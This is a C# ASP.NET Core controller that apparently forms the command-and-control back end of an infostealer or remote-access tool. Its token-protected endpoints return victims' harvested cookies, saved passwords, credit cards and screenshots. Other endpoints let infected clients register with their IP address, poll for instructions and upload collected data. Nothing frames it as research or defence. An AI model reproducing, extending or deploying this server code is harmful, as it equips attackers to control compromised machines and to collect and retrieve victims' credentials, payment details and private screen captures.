using Microsoft.AspNetCore.Mvc;
using X_ZIGZAG_SERVER_WEB_API.Filters;
using X_ZIGZAG_SERVER_WEB_API.Interfaces;
using X_ZIGZAG_SERVER_WEB_API.Models;
using X_ZIGZAG_SERVER_WEB_API.ViewModels.Request;
namespace X_ZIGZAG_SERVER_WEB_API.Controllers
{
    [Route("[controller]")]
    [ApiController]
    public class ClientController : ControllerBase
    {
        IClientService clientService;
        public ClientController(IClientService clientService)
        {
            this.clientService = clientService;
        }
        [ServiceFilter(typeof(TokenValidationFilter))]
        [HttpGet]
        public async Task<IActionResult> GetAllClients()
        {
            var result = await clientService.GetAll();
            return Ok(result.DevicesInfo);
        }
        [ServiceFilter(typeof(TokenValidationFilter))]
        [HttpGet("{uuid}")]
        public async Task<IActionResult> GetClient(string uuid)
        {
            var result = await clientService.GetOne(uuid);
            if (result== null)
            {
                return NotFound();
            }
            return Ok(result);
        }
        [ServiceFilter(typeof(TokenValidationFilter))]
        [HttpGet("Cookies/{uuid}")]
        public async Task<IActionResult> GetClientCookies(string uuid)
        {
            var result = await clientService.GetCookies(uuid);
            if (result == null)
            {
                return NotFound();
            }
            return Ok(result);
        }
        [ServiceFilter(typeof(TokenValidationFilter))]
        [HttpGet("CreditCards/{uuid}")]
        public async Task<IActionResult> GetClientCreditCards(string uuid)
        {
            var result = await clientService.GetCreditCards(uuid);
            if (result == null)
            {
                return NotFound();
            }
            return Ok(result);
        }
        [ServiceFilter(typeof(TokenValidationFilter))]
        [HttpGet("Passwords/{uuid}")]
        public async Task<IActionResult> GetClientPassword(string uuid)
        {
            var result = await clientService.GetPasswords(uuid);
            if (result == null)
            {
                return NotFound();
            }
            return Ok(result);
        }
        [ServiceFilter(typeof(TokenValidationFilter))]
        [HttpGet("Screenshots/{uuid}")]
        public async Task<IActionResult> ClientsScreenshots(string uuid)
        {
            var result = await clientService.GetScreenshots(uuid);
            if (result == null)
            {
                return NotFound();
            }
            return Ok(result);
        }
        [ServiceFilter(typeof(TokenValidationFilter))]
        [HttpGet("Screenshots/{uuid}/{screenIndex}/{screenshotName}")]
        public IActionResult GetScreenshot(string uuid,int screenIndex, string screenshotName)
        {
            var result =  clientService.GetScreenshot(uuid, screenIndex, screenshotName);
            if (result == null)
            {
                return NotFound();
            }
            return result;
        }
        [ServiceFilter(typeof(TokenValidationFilter))]
        [HttpGet("Screenshots/Preview/{uuid}/{screenIndex}/{screenshotName}")]
        public IActionResult GetScreenshotPreview(string uuid, int screenIndex, string screenshotName)
        {
            var result = clientService.GetScreenshotPreview(uuid, screenIndex, screenshotName);
            if (result == null)
            {
                return NotFound();
            }
            return result;
        }
        [ServiceFilter(typeof(TokenValidationFilter))]
        [HttpPatch("Settings/{uuid}")]
        public async Task<IActionResult> UpdateClientSettings(string uuid, [FromBody] SettingsRequestVM setting)
        {
            var result = await clientService.UpdateSetting(uuid, setting);
            if (result == null)
            {
                return Ok();
            }
            return NotFound(result.Message);
        }
        [HttpGet("Check/{uuid}")]
        public async Task<IActionResult> Check(string uuid)
        {
            var result = await clientService.Check(uuid);
            if (result.Code !=null && result.Code == -1)
            {
                return NotFound();
            }

            return Ok(new { Instructions = result.Instructions, Screenshot = result.Screenshot, NextPing = result.NextPing });
        }
        [HttpPost]
        public async Task<IActionResult> Login([FromBody] ClientLoginVM loginInfo)
        {
            var result = await clientService.Login(loginInfo);
            if (result)
            {
                return Ok();
            }
            return NotFound();
        }
        [HttpPost("New")]
        public async Task<IActionResult> SignUp([FromBody] ClientInfoVM Info)
        {
            Info.IpAddress = HttpContext.Connection.RemoteIpAddress?.ToString();
            if(ModelState.IsValid)
            {
                var result = await clientService.SignUp(Info);
                return Ok(result);
            }
            return BadRequest(ModelState);
        }
        [HttpPost("Update/{instructionId}")]
        public async Task<IActionResult> UpdateData([FromBody] ClientInfoVM Info,long instructionId)
        {
            Info.IpAddress = HttpContext.Connection.RemoteIpAddress?.ToString();
            if (ModelState.IsValid)
            {
                var result = await clientService.UpdateInfo(Info, instructionId);
                return Ok(result);
            }
            return BadRequest(ModelState);
        }

    }
}
